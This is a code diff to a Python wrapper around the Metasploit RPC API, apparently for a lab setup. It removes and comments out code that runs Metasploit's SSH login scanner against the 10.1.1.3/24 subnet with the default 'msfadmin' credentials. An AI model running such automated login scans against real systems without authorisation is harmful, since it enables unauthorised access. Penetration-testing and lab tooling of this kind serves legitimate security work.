@@ -8,7 +8,7 @@ class Metasploit:
     def __init__(self, password, Eshu, server="127.0.0.1", port=1337):
         self.name = "Metasploit API"
         self.start_msfconsole_with_script("/usr/src/metasploit-framework/docker/msfconsole.rc")
-        print(f"Starting {self.name}")
+        print(f"=============== Starting {self.name} ================")
         while True:
             try:
                 self.client = MsfRpcClient(password, server=server, port=port)  # Fix: Ensure this import works
@@ -39,20 +39,6 @@ class Metasploit:
             print(f"[!] Error starting msfconsole: {e}")
 
     def query_hosts(self):
-        
-        run_exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-        run_exploit["RHOSTS"] = '10.1.1.3/24'
-        run_exploit["USERNAME"] = 'msfadmin'
-        run_exploit["PASSWORD"] = 'msfadmin'
-        run_exploit["THREADS"] = 5 
-        print(f"Running exploit: {run_exploit} with 1 second scan...")
-        result = run_exploit.execute()
-        time.sleep(1)  # Allow time for the scan to run
-        if 'job_id' in result:
-            print("[+] Scan Complete!")
-        else:
-            print("[!] Scan failed. Retrying...")
-        
         """Retrieve all active sessions from Metasploit."""
         hosts = []
         print("Retrieving active sessions in Metasploit...")
@@ -116,23 +102,25 @@ class Metasploit:
            raise ConnectionError("[!] Not connected")
        return self.client.modules.search(module_type)
     
-    def run_exploit(self, mtype, mname):
-
-        # print(f"Type = {mtype} , name = {mname}")
-        exploit = self.client.modules.use(mtype, mname)
-        exploit["RHOSTS"] = '10.1.1.3/24'
-        exploit["USERNAME"] = 'msfadmin'
-        exploit["PASSWORD"] = 'msfadmin'
-        exploit["THREADS"] = 5 
-        print(f"Running exploit: {exploit} with 1 second scan...")
-        result = exploit.execute()
-        # print(result)
-        time.sleep(1)  # Allow time for the scan to run
-        
-        
-        if 'job_id' in result:
-            print("[+] Scan Complete!")
-            time.sleep(1)
-        # break
-        else:
-            print("[!] Scan failed. Retrying...")
+    # LEAVE THIS OPTION
+    #def run_exploit(self, mtype, mname):
+#
+    #    # print(f"Type = {mtype} , name = {mname}")
+    #    exploit = self.client.modules.use(mtype, mname)
+    #    # print(exploit.options)
+    #    exploit["RHOSTS"] = '10.1.1.3/24'
+    #    exploit["USERNAME"] = 'msfadmin'
+    #    exploit["PASSWORD"] = 'msfadmin'
+    #    exploit["THREADS"] = 5 
+    #    print(f"Running exploit: {exploit} with 1 second scan...")
+    #    result = exploit.execute()
+    #    # print(result)
+    #    time.sleep(1)  # Allow time for the scan to run
+    #    
+    #    
+    #    if 'job_id' in result:
+    #        print("[+] Scan Complete!")
+    #        time.sleep(1)
+    #    # break
+    #    else:
+    #        print("[!] Scan failed. Retrying...")
